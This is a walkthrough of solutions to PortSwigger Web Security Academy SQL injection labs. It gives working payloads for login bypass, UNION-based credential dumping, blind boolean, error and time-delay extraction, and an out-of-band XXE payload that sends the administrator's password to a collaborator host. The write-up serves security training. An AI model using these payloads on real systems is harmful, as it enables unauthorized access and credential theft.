# SQL Injection

## Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Sol:
`+OR+1=1`

![image](https://user-images.githubusercontent.com/33444140/234489856-c3dd5689-888c-4571-b135-030024b0af06.png)

## Lab 2: SQL injection vulnerability allowing login bypass

### Sol:

`administrator'--`

![image](https://user-images.githubusercontent.com/33444140/234491811-0cffcfb0-ba68-4bfa-8d8a-14bc8ab32d66.png)

![image](https://user-images.githubusercontent.com/33444140/234492060-e5cd29d0-f65c-4d79-b894-efa1394cda95.png)

## Lab 3: SQL injection UNION attack, determining the number of columns returned by the query

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

### Sol :

`category='Pets'+union+select+null,null,.....<No of null occurences> --`

### Using one and two null values will gives us Internal Server Error due to non-matching of null values with no of cols

    category=Pets+union+select+null--
    
![image](https://user-images.githubusercontent.com/33444140/235349085-16ab2024-dbfa-4a0d-bf25-6767545b482a.png)

### Using third null will match the no of cols

    category=Pets+union+select+null,null,null--
    
![image](https://user-images.githubusercontent.com/33444140/235349154-0bcd2a7f-9f72-467f-be22-baae68c20f85.png)

### Alternate Sol :

> An alternate solution to count the no of cols by using `ORDER BY`. Injecting `ORDER BY 1--` will order the results by the first column of the result. Incrementing the value leads to an internal server error when using `ORDER BY 4--` as the database is instructed to order by a column that does not exist. Thus the correct number of columns is 3.    
 
## Lab 4: SQL injection UNION attack, finding a column containing text.

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

Make the database retrieve the string: 'e0J9uf'

### Sol :

  First we have to determine the no of cols of the category by using NULL values as shown above.
  
    category=Pets+union+select+null,null,null--
    
Then we have to check which col contains string by replacing null with 'a' each col

    category=Pets+union+select+'a',null,null--
    category=Pets+union+select+null,'a',null--
    category=Pets+union+select+null,null,'a'--
    
In this lab category we got 2nd col as string. So we replace `'a'` with the desired string.

    category=Pets+union+select+null,'e0J9uf',null--
    
Lab is solved.

![image](https://user-images.githubusercontent.com/33444140/235350029-db8d0569-07c6-4caf-baa9-913039a30d35.png)

## Lab 5: SQL injection UNION attack, retrieving data from other tables

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

### Sol :

First we determine two no of cols by running nul values and 'a' for confirming that it contains two string values.

        category=Lifestyle+union+select+'a','a'--
        
Then we give the username and password from users table to retreive the user credentials.

        category=Lifestyle+union+select+username,password+from+users--
        
After running it, we can see the users information.

![image](https://user-images.githubusercontent.com/33444140/235350807-d231e047-3c31-43f9-a6ee-d0bf8c80c2d7.png)

Logging in as administrator with its password.

![image](https://user-images.githubusercontent.com/33444140/235350892-d6d3c3af-282b-49d0-a403-211b8a6c7aa6.png)

## Lab 6: SQL injection UNION attack, retrieving multiple values in a single column

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

![image](https://user-images.githubusercontent.com/33444140/235353628-0dcb4114-4d79-4380-8474-fb1bbc47d882.png)

### Sol :

First we have to check the no of cols :
    
        category=Pets+union+select+null,null--
        
Then we check for which is string related col :

        category=Pets+union+select+null,null,'a'--
        
Then we give username and password as concatenated string

        category=Pets+union+select+null,username||'~'||password+from+users--
        
We will get the user credentials with ~ seperator

![image](https://user-images.githubusercontent.com/33444140/235354047-ea538ef2-4e48-425a-9388-4321d44d4137.png)

Then we give the administrator password to solve this lab.

![image](https://user-images.githubusercontent.com/33444140/235354088-49c50988-df94-47e0-bd8b-e52dd05ac795.png)

## Lab 7 : SQL injection attack, querying the database type and version on Oracle

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Make the database retrieve the strings: 'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'

![image](https://user-images.githubusercontent.com/33444140/235354756-30e94167-685b-4de7-a325-040f9d1ac23a.png)

### Sol :

First we check the no of cols by injecting null values with dual for oracle database

        category=Gifts'+union+select+null,null+from+dual--

Then we give `SELECT * FROM v$version` to retreive the Oracle database info

        category=Gifts'+union+select+null,banner+from+v$version--
        
We will get the database info and lab got solved

![image](https://user-images.githubusercontent.com/33444140/235355211-844b8eaf-5ba2-4887-b105-f5012f86a243.png)

## Lab 8: SQL injection attack, querying the database type and version on MySQL and Microsoft.

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Make the database retrieve the string: '8.0.32-0ubuntu0.20.04.2'

### Sol :

First we have to check the no of cols and string match :
    
        category=Gifts+union+select+null,'a'--
        
Then we give `select @@version` for MySQL and Microsoft version and `%23` for `#` to comment out.

        category=Gifts'+union+select+null,@@version%23
        
![image](https://user-images.githubusercontent.com/33444140/235367798-c5c89b60-5e10-4f1d-abc5-428882ae8e06.png)

## Lab 9: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

### Sol :

First we list the tables by using `information_schema.tables` query

        category=Pets'+union+select+table_name,+null+from+information_schema.tables--
        
![image](https://user-images.githubusercontent.com/33444140/235371041-3593a411-d557-4d5d-96d9-3e26dbdca292.png)

![image](https://user-images.githubusercontent.com/33444140/235371071-f7e2fb65-4ccf-4e26-b648-50724b6417c0.png)

Now we select col names from the table `users_xmoqhn`

        category=Pets'+union+select+column_name,+null+from+information_schema.columns+where+table_name='users_xmoqhn'--

![image](https://user-images.githubusercontent.com/33444140/235371245-20b6e4e0-29cf-4a62-af19-2f36ce1011d1.png)
![image](https://user-images.githubusercontent.com/33444140/235371259-90e83d8b-5b64-4230-a6b4-eaffb0d20dd2.png)

Now we enumerate all user credentials by above info

        category=Pets'+union+select+username_actmim,+password_kuerfj+from+users_xmoqhn--
        
We got the administrator password and logged in to solve the lab.

![image](https://user-images.githubusercontent.com/33444140/235371441-0cb7b2e7-c9a8-4af8-9bff-c71e7a9638d4.png)

![image](https://user-images.githubusercontent.com/33444140/235371476-b2279d4d-38fe-4acd-9ba8-38bd08392722.png)

## Lab 10: SQL injection attack, listing the database contents on Oracle

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user

### Sol :

First we list the tables present

        category=Pets'+union+select+table_name,null+from+all_tables--
        
![image](https://user-images.githubusercontent.com/33444140/235371884-fe186a04-9aaa-449d-a377-7c53a4a7f3a2.png)

Then we check for users table

        category=Pets%27+union+select+column_name,null+from+all_tab_columns+where+table_name=%27USERS_RKONPB%27--

![image](https://user-images.githubusercontent.com/33444140/235372070-0a88e270-3820-4c4e-a42f-ab88800513de.png)
![image](https://user-images.githubusercontent.com/33444140/235372077-b7822dc8-1201-4780-b2db-9e3ea0c33371.png)

We got the user credentials

![image](https://user-images.githubusercontent.com/33444140/235372208-6d06c55e-3a1b-4a59-8b5d-26818f89c7e0.png)

We logged in as administrator and solved the lab.

![image](https://user-images.githubusercontent.com/33444140/235372244-c8b2cfa7-55c7-40ce-af82-cd74c7ef7509.png)

## Lab 11: Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

### Sol:

Open Burpsuite and select Proxy tab to intercept the connection to get the cookie id

Send to repeater and off the intercepter in proxy tab.

![image](https://user-images.githubusercontent.com/33444140/235512759-45ae911a-1abb-452b-93f1-c5cbe3e5a815.png)

Perform SQL injection in place of cookie TrackingID and search for welcome back message
    
        TrackingId=x'+AND+1=1--

![blind2](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/6d877d3e-9774-4820-ad18-3f1453f108ba)


If we tried with `1=2` condition it won't get the result

![blind3](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/f1c84a6d-3165-48c3-9e0f-a198e569550f)

Now, we check for users tabele.

![blind4](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/e08431e7-fae5-40c8-8277-4bf3a0fdb390)

Now lookup for administrator user entry

        TrackingId=x'+union+select+'a'+from+users+where+username='administrator'--        
        
![blind5](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/4a9e5b58-d0ae-4464-8975-72603d10612b)

Now we have to guess the password length by checking each numbers at one time.

        TrackingId=x'+union+select+'a'+from+users+where+username='administrator'+and+length(password)>1--
        TrackingId=x'+union+select+'a'+from+users+where+username='administrator'+and+length(password)>2--
        TrackingId=x'+union+select+'a'+from+users+where+username='administrator'+and+length(password)>3--
        .
        .
        .

Like that we have to check till the Welcome back messages would not return. In this lab we got upto 19 so the password length is 20.

We will go for payloads in Burp Intruderfor this.

![blind6](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/60cb616d-9141-4ae0-a6b2-604dcc1e3e69)

We will check for password length by running numbers payload.

![blind7](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/126e1742-f5c4-4c49-9bb4-98012b65868f)

As we search for `welcome back` message we will give it same for grep match.

![blind8](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/14ce2369-14bf-4c0e-9786-c128d11ed836)

If we click `start attack` the numbers payload run and it will show the password length.

![blind9](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/9253b495-2383-4911-9606-6c20e12a2480)

Now time for guessing administrator password

![blind10](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/30549ea8-33d3-4dcd-b669-98a333dc5d06)

We will give payload consists of `0-9` and `a-z` list.

![blind11](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/48691187-f898-4b63-b8ca-d7ed0f616df4)

We will get first password letter as payload output 

![blind12](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/0aa18605-5880-45c3-acf4-1c9aabc9c11b)

Then we will change the line of 2nd letter, and so on as:

        (SELECT SUBSTRING(password,1,1) FROM users.....
        (SELECT SUBSTRING(password,2,1) FROM users.....
        (SELECT SUBSTRING(password,3,1) FROM users.....
        (SELECT SUBSTRING(password,4,1) FROM users.....
        .
        .
        .
        .
After running for all 20 length letters. we will get the administrator password

![blind13](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/6131a956-3417-4b06-b120-9c656fc02086)

We will login with those details.

![blind14](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/42119809-35e0-49c7-840a-7fd5684c4a7e)

Thus, Lab is solved.

## Lab 12: Blind SQL injection with conditional errors

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

### Sol :

Send the page request to repeater through proxy.

Check the tracking id by giving `'`. We will get internal server error.

![blind1](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/daa56920-5b69-43de-9cbc-f890b875af12)

If we give double quotations `' '`, we won't get the error.

![blind2](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a1525648-c4e9-449e-bab5-21b3000fe229)

Check the case condition with the tracking id for users info

![blind3](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/45169f0f-17dd-4ac2-a7f8-2ed7b493e058)

Determine password length by giving

![4](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/8c7e468d-e375-433a-8e03-a3e6dd1e1954)

Send it to Intruder for payload information

![5](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/3e9713fe-7b41-45eb-9c59-6bf397ee5ccd)

Select numbers list and find out the password length

![6](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/ae44fe2b-16b2-47ae-bc5a-0fddbee46a27)

Here we can see it is 20 in length.

Next we check for password letter.

![7](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/8a39d8e1-eea9-4688-b0a5-8a8f2d2124d3)

Adding payload of `0-9` and `a-z`

![8](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d4a2a654-3440-475e-bf38-e17c87cce9f4)

Checking for each password letter we will get different length value that differs with others.

![9](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/c0c06ff6-c7ed-4316-afb9-58a8dd9f4107)

        SUBSTR(password,1,1).....
        SUBSTR(password,2,1).....
        SUBSTR(password,3,1).....
        .
        .
        .
        
We will get all 20 password letters and we will login as administrator

![10](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/bd217603-13eb-4764-91ea-e8346e81669e)

Thus, Lab is solved.

## Lab 13: Visible error-based SQL injection

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.

### Sol :

Through Proxy we will send the request to intruder and get the Cookie ID

If we give `id='--` It accepts and won't generate any error.

![1](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/3f9d757c-1a74-44c1-ac0c-94e7d090b14b)

Now, we search for a username in users table. We got the first user itself as administrator

![3](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/b78356d3-3d7f-49d2-901b-c6c9284c12aa)

So if we substitute password with username we can get the password of administrator.

![2](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/e4cc1135-a4e1-4e9c-8bba-f794094d3b3b)

![4](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/59077d3d-296a-46c4-99a9-d24a1fa404a2)

We will enter the password and logged in as administrator.

Thus, the lab is solved.

## Lab 14: Blind SQL injection with time delays

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

### Sol :

Through Proxy we will send the request to intruder and get the Cookie ID

![lab1](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/9b4ab146-c372-429f-9e15-ecf6200a4f86)

We will give command `||pg_sleep(10)--` for time delays

![2](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/dcc27393-46e6-4738-b384-08eedfbd0343)

Response will be delayed for 10 seconds and it got time delayed.

Thus , the lab is solved.

## Lab 15: Blind SQL injection with time delays and information retrieval

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

### Sol :

Through Proxy we will send the request to intruder and get the Cookie ID

We will verify whether it responds for time delay.

![1](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/978d821e-e6c9-42da-882a-bb1afa5415be)

Determining password length for the username

![2](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/414ce5b5-244c-4f2c-9d6f-fc588d7aae42)

Sending it to the intruder 

![3](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d866069f-a035-4748-b054-76f04a040826)

Giving payload that consists of `0-9` and `a-z`

![4](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/35af7435-2e6f-4ed8-a989-45e147121e40)

We will get a letter which we find out through high value in response received than others.

We will find password letter further.

        SUBSTR(password,1,1).....
        SUBSTR(password,2,1).....
        SUBSTR(password,3,1).....
        .
        .
        .
        
At last, we will get the administrator password

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/0ddbcb40-6d09-41ed-a9bf-bb1c570ce81a)

Enter administrator username and its password

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/0b179563-62a6-4323-9787-b962736e9371)

Thus, lab is solved.

## Lab 16: Blind SQL injection with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

### Sol :

* Intercept the request through burpsuite and send it to repeater

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/36e4ccaf-7260-4510-bd14-f5b2b915b72b)

* Modify the `TrackingId` cookie to the a payload that will trigger an interaction with the Collaborator server. 

            TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[ <!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

* Right-click and select `Insert Collaborator payload` to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.

## Lab 17: Blind SQL injection with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

### Sol :

* Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
* Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:

        TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

* Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/0d506ee4-31fe-4533-bc57-2d962b4afc1d)

* Thus, the lab is solved.

## Lab 18: Blind SQL injection with out-of-band data exfiltration

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

### Sol :

* Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the TrackingId cookie.
* Modify the TrackingId cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:

      TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

* Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.
* Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously
* You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the administrator user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.
* In the browser, click "My account" to open the login page. Use the password to log in as the administrator user.

